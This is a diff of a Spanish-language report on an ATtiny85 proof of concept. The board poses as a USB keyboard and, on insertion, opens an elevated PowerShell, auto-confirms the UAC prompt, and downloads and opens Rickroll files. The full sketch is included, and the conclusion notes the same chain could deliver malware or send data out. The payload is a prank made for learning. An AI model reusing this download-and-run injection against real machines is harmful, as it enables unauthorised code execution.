@@ -1,4 +1,4 @@
-# Reporte de Creación de Clúster de base de datos y pruebas con Sysbench
+# Reporte de Prueba de Concepto en ATtiny85
 En este reporte se describirá el proceso de creación e implementación de una PoC, así como la
 preparación del entorno de Arduino para codificar en la Attiny85.
 
@@ -72,4 +72,127 @@ Solo basta con copiar el link del *json* a la sección dentro de *Arduino IDE* *
 de **Additional Board Manager URLs** se pega el link del *json*:
 
 ![image](https://github.com/user-attachments/assets/427acde7-46fb-417c-b376-924a465e7ba9)
+
+Ahora si está disponible la placa necesaria para tener comunicación y carga de código.
+
+##Creación de PoC
+
+Ésta PoC será sencilla; crea un programa que abra powershell y que descargue archivos de la red hacia el escritorio de la PC y después abrirlos. AL principio tenía algo más grande en mente, pero ya verán a lo que me refiero...
+
+La librería `DigiKeyboard.h` nos permite simular tecleos por medio de la interfaz HID del sistema. Prácticamente haremos una commputadora que escriba comandos cuando nadie este tecleando.
+
+Cada vez que se escriba código por buena práctica se pondran *delays* entre cada comando; pues si se ejecutan comandos cuando algún proceso crucial no halla terminado, estaremos en problemas. Algunos de estos ejemplos es:
+
+`DigiKeyboard.delay(3000);`
+
+Para simular las presiones de teclas usamos la siguiente función:
+
+`DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);`
+
+Aquí puede apreciar que ya hay teclas definidas en el mismo `DigiKeyboard.h` para facilitar la compresión del código. La línea anterior simula presionar el atajo de windows para el cuadro de *run*.
+
+![image](https://github.com/user-attachments/assets/a60f92b8-b400-4a66-8c20-30f1267ffb89)
+
+
+Necesitaremos descargar una imagen de internet y una canción, y lo haremos mediante de comandos de powershell. Para ello necesitamos invocar el cuadro de powershell:
+
+`DigiKeyboard.println(F("powershell Start-Process powershell -Verb runAs"));`
+`DigiKeyboard.delay(2000);`
+
+![image](https://github.com/user-attachments/assets/52488c53-a6bd-4631-b7eb-9408939dbf14)
+
+Después se le dice que *sí* para ejecutar como administrador y nos trae a la ventana de Powershell. Ahora si descargamos los archivos con el comando `Invoke-WebRequest`:
+```
+DigiKeyboard.println(F("Invoke-WebRequest -Uri 'https://files.ceenaija.com/wp-content/uploads/music/2023/07/Rick_Astley_-_Never_Gonna_Give_You_Up_CeeNaija.com_.mp3' -OutFile \"$env:UserProfile\\desktop\\never_gonna_give_you_up.mp3\""));
+DigiKeyboard.delay(10000);
+
+DigiKeyboard.println(F("Invoke-WebRequest -Uri 'https://static1.srcdn.com/wordpress/wp-content/uploads/2020/04/Rickroll-Wide.jpg' -OutFile \"$env:UserProfile\\desktop\\lol.jpg\""));
+DigiKeyboard.delay(500);
+```
+
+Finalmente debemos abrir ambos archivos. Para ello el comando `Start-Process` es necesario junto con la ruta de los archivos:
+```
+DigiKeyboard.println(F("Start-Process \"$env:UserProfile\\desktop\\never_gonna_give_you_up.mp3\""));
+DigiKeyboard.delay(500);
+
+DigiKeyboard.println(F("Start-Process \"$env:UserProfile\\desktop\\lol.jpg\""));
+DigiKeyboard.delay(500);
+DigiKeyboard.sendKeyStroke(KEY_F11);
+DigiKeyboard.delay(500);
+```
+La función con `KEY_F11` es para poner la imagen en pantalla completa.
+Como observan todos los recursos viene directo de la web, sin necesidad de abrir ningún navegador u cualquier otra aplicación.Con solo insertar la ATtiny85 a la computadora, todo se hace en automático.
+
+![image](https://github.com/user-attachments/assets/f1b8ca9b-6cc8-4f9c-8e46-38dfbab3560e)
+
+![image](https://github.com/user-attachments/assets/9ff68662-da05-4237-aa7d-629f6dce07a2)
+
+![image](https://github.com/user-attachments/assets/192fc02c-fda5-435b-8fcf-3bd0c23077c1)
+
+Sin embargo existen un par de limitaciones:
+1. EL teclado de la computadora debe estar en **Inglés(Estados Unidos)**, pues de no ser así el powershell no se ejecutará adecuadamente y se cerrará instantáneamente.
+2. Si la computadora no tiene internet, los recursos no se pueden descargar.
+
+Aqui dejo el código completo:
+
+```
+#include "DigiKeyboard.h"
+
+void setup() {
+    pinMode(1, OUTPUT); // LED en modelo A
+}
+
+void loop() {
+    DigiKeyboard.update();
+    DigiKeyboard.sendKeyStroke(0);
+    DigiKeyboard.delay(3000);
+
+    // Abrir "Ejecutar"
+    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+    DigiKeyboard.delay(500);
+
+    // Escribir el comando para abrir PowerShell como administrador
+    DigiKeyboard.println(F("powershell Start-Process powershell -Verb runAs"));
+    DigiKeyboard.delay(2000);
+
+    // Enviar la tecla "Enter" para confirmar el UAC (si es necesario)
+    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+    DigiKeyboard.delay(500);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(2000);
+
+    // Descargar la canción
+    DigiKeyboard.println(F("Invoke-WebRequest -Uri 'https://files.ceenaija.com/wp-content/uploads/music/2023/07/Rick_Astley_-_Never_Gonna_Give_You_Up_CeeNaija.com_.mp3' -OutFile \"$env:UserProfile\\desktop\\never_gonna_give_you_up.mp3\""));
+    DigiKeyboard.delay(10000); // Dar más tiempo para la descarga (10 segundos)
+
+    // Descargar la imagen
+    DigiKeyboard.println(F("Invoke-WebRequest -Uri 'https://static1.srcdn.com/wordpress/wp-content/uploads/2020/04/Rickroll-Wide.jpg' -OutFile \"$env:UserProfile\\desktop\\lol.jpg\""));
+    DigiKeyboard.delay(5000); // Dar más tiempo para la descarga
+
+    // Reproducir la canción
+    DigiKeyboard.println(F("Start-Process \"$env:UserProfile\\desktop\\never_gonna_give_you_up.mp3\""));
+    DigiKeyboard.delay(500);
+
+    // Abrir la imagen en pantalla completa
+    DigiKeyboard.println(F("Start-Process \"$env:UserProfile\\desktop\\lol.jpg\""));
+    DigiKeyboard.delay(1000);
+    DigiKeyboard.sendKeyStroke(KEY_F11);
+    DigiKeyboard.delay(500);
+    
+    // Enciende el LED para indicar que terminó
+    digitalWrite(1, HIGH);
+    DigiKeyboard.delay(3000);
+    digitalWrite(1, LOW);
+
+    while (1); // Detiene el loop
+}
+```
+##Conclusiones
+
+Imagine usted que en lugar de una canción o una imagen, el archivo a descargar y ejecutar sea un malware que destruya una computadora
+desde dentro en segundos, o que contenga un programa que tome datos de tu computadora y los envie a mi correo...Estas aplicaciones son vitales a la hora de crear soluciones ante amenazas.
+
+Había comentado que tenía algo en mente un poco más complejo que era cambiar el fondo de pantalla. Suena como una tarea tan sencilla como abrir la imagen, pero estuve horas debbugeando y no pude encontrar la forma de hacerlo, pues aún cambiando el registro del sistema en el apartado *WallPaper* la ruta de la imagen estaba aplicada pero por alguna razón no se cambiaba el fondo de pantalla. Debe ser alguna medida de seguridad por parte del windows que no permite eso, y por estos tipos de PoC se pueden pensar en nuevas formas de romper sistemas, así como
+cúal sería su solución.
+
 
